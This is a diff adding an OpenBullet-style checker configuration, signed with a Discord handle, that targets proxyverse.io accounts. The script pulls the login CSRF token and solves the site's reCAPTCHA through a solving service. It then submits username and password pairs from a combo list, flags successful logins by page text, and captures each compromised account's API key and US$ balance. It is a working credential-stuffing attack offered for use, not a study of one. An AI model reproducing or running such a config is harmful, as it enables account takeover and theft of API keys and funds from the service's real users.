@@ -1,0 +1,97 @@
+[SETTINGS]
+{
+  "Name": "Proxyverse.io (Need Solver)",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-28T18:19:14.48207+04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "🔥 YASHVIRGAMING#7131 🔥",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://proxyverse.io/accounts/login/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#TK PARSE "<SOURCE>" LR "<input type=\"hidden\" name=\"csrfmiddlewaretoken\" value=\"" "\">" -> VAR "TK" 
+
+SOLVECAPTCHA ReCaptchaV2 "6LcaY0AaAAAAANUQ8eT9_OblESbKm36lgXTvrdcb" "https://proxyverse.io/accounts/login/" 
+
+REQUEST POST "https://proxyverse.io/accounts/login/" 
+  CONTENT "csrfmiddlewaretoken=<TK>&login=<USER>&password=<PASS>&g-recaptcha-response=<SOLUTION>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 641" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://proxyverse.io" 
+  HEADER "referer: https://proxyverse.io/accounts/login/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The e-mail address and/or password you specified are not correct." 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES(*)>" Contains "Successfully signed in as" 
+    KEY "<COOKIES{*}>" Contains "Successfully signed in as" 
+    KEY "Logout" 
+
+REQUEST GET "https://proxyverse.io/profile" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Api_Key PARSE "<SOURCE>" LR "id=\"apiKey\" class=\"input block w-full border mt-2 enabled\" enabled value=\"" "\">" CreateEmpty=FALSE -> CAP "Api Key" 
+
+REQUEST GET "https://proxyverse.io/referrals" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Balance PARSE "<SOURCE>" LR "<label class=\"text-green-500 text-4xl font-bold\">US$" "</label>" CreateEmpty=FALSE -> CAP "Balance" "US$" "" 
+
+#AUTHOR FUNCTION Constant "🔥 YASHVIRGAMING#7131 🔥" -> CAP "Config By " 
+
+REPORTCAPTCHA ImageCaptcha "<CAPTCHAID>" 
+
